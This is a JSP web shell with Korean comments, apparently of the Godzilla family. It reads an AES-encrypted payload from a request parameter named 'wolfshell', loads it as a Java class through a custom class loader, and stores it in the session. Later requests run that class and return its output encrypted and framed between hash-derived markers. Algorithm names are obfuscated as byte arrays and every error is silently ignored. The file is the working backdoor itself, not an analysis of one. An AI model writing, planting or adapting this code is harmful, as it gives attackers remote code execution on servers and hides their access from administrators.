<%!
String cfg_k1="3c6e0b8a9c15224a";
String cfg_p2="wolfshell";
String cfg_h3=hash(cfg_p2+cfg_k1);
class CLoader extends ClassLoader{public CLoader(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);}}
public byte[] xform(byte[] s,boolean m){try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(new String(new byte[]{65,69,83}));c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(cfg_k1.getBytes(),new String(new byte[]{65,69,83})));return c.doFinal(s);}catch(Exception e){return null;}}
public static String hash(String s){String ret=null;try{java.security.MessageDigest m;m=java.security.MessageDigest.getInstance(new String(new byte[]{77,68,53}));m.update(s.getBytes(),0,s.length());ret=new java.math.BigInteger(1,m.digest()).toString(16).toUpperCase();}catch(Exception e){}return ret;}
public static String b64enc(byte[] bs) throws Exception{
    // 이 함수는 데이터를 인코딩합니다.
    Class b;String val=null;
    try{b=Class.forName("java.util.Base64");Object enc=b.getMethod("getEncoder",null).invoke(b,null);val=(String)enc.getClass().getMethod("encodeToString",new Class[]{byte[].class}).invoke(enc,new Object[]{bs});
    }catch(Exception e){try{b=Class.forName("sun.misc.BASE64Encoder");Object enc=b.newInstance();val=(String)enc.getClass().getMethod("encode",new Class[]{byte[].class}).invoke(enc,new Object[]{bs});}catch(Exception e2){}}
    return val;
}
public static byte[] b64dec(String bs) throws Exception{
    // 배고파요, 치킨 먹고 싶다.
    Class b;byte[] val=null;
    try{b=Class.forName("java.util.Base64");Object dec=b.getMethod("getDecoder",null).invoke(b,null);val=(byte[])dec.getClass().getMethod("decode",new Class[]{String.class}).invoke(dec,new Object[]{bs});
    }catch(Exception e){try{b=Class.forName("sun.misc.BASE64Decoder");Object dec=b.newInstance();val=(byte[])dec.getClass().getMethod("decodeBuffer",new Class[]{String.class}).invoke(dec,new Object[]{bs});}catch(Exception e2){}}
    return val;
}
%><%
// 요청 처리 시작점.
try{
    int state_flag = 0;
    // 세션에 페이로드가 있는지 확인합니다.
    if(session.getAttribute("payload") != null) {
        state_flag = 1;
    }
    
    byte[] data_in = b64dec(request.getParameter(cfg_p2));
    data_in = xform(data_in, false);
    
    // 상태 플래그에 따라 분기합니다.
    switch(state_flag) {
        case 0:
            // 상태 0: 페이로드 로드
            session.setAttribute("payload", new CLoader(this.getClass().getClassLoader()).Q(data_in));
            break;
        case 1:
            // 상태 1: 페이로드 실행
            request.setAttribute("parameters", data_in);
            java.io.ByteArrayOutputStream byte_out = new java.io.ByteArrayOutputStream();
            Object payload_obj = ((Class)session.getAttribute("payload")).newInstance();
            // 이 메소드 호출은 중요합니다. 수정하지 마세요.
            payload_obj.equals(byte_out);
            payload_obj.equals(pageContext);
            response.getWriter().write(cfg_h3.substring(0, 16));
            payload_obj.toString();
            response.getWriter().write(b64enc(xform(byte_out.toByteArray(), true)));
            response.getWriter().write(cfg_h3.substring(16));
            break;
        default:
            // 이 코드는 실행되지 않아야 합니다.
            break;
    }
}catch (Exception e){
    // 모든 예외는 조용히 무시됩니다.
}
%>